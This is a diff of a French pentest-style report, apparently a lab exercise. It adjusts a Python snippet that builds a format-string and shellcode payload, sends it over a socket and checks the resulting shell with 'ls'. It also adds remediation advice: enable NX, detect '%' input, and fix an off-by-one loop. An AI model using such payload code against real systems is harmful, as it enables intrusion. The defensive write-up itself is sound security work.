@@ -116,13 +116,13 @@ with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
     charge_2 = charge_1+milieu_ajout
     fin_adresse = int(adresse[-2:], 16)- 4 # on convertit en decimal et on retranche 4
 
-    charge_3 = charge_2 + hex(fin_adresse)[2:] + adresse_4[2:-2][-2:] + adresse_4[2:-2][-4:-2]
-    charge_3 += adresse_4[2:-2][0:2] + "0a" # c'est du little endian
+    charge_3 = charge_2 + hex(fin_adresse)[2:] + adresse_4[2:-2][-2:]
+    charge_3 += adresse_4[2:-2][-4:-2] + adresse_4[2:-2][0:2] + "0a"
 
     charge_4 = binascii.unhexlify(charge_3) #on ajoute les "/x"
 
     s.sendall(charge_4)
-    s.sendall(b'ls \n') # on vérifie que le shell fonctionne
+    s.sendall(b'ls \n')
     data_reception = s.recv(1024)
     print(data_reception)
 ```
@@ -134,7 +134,10 @@ Voici ce que donne le lancement de ce code sur la machine Analyste :
 
 # Recommandations pour le client
 
-
+Voici des recommandations pour le client afin d'améliorer sa sécurité et d'éviter à l'avenir une attaque similaire:
+- Il faut  détecter "%" comme étant une tentative d'attaque "format string".
+- Il faut activer le bit NX. Si la pile n'avait pas été exécutable, le shellcode n'aurait pu fonctionner. La désactivation de la pile est rendue possible par la fonction *donxoff()* de *main.c*, il faudrait enlever cette option pour améliorer la sécurité.
+- Pour éviter le Buffer Overflow, il faut remplacer le "<=" en "<" dans la boucle "for" de la fonction sanitizeBuffer() ligne 55.
 
 # Conclusion
 
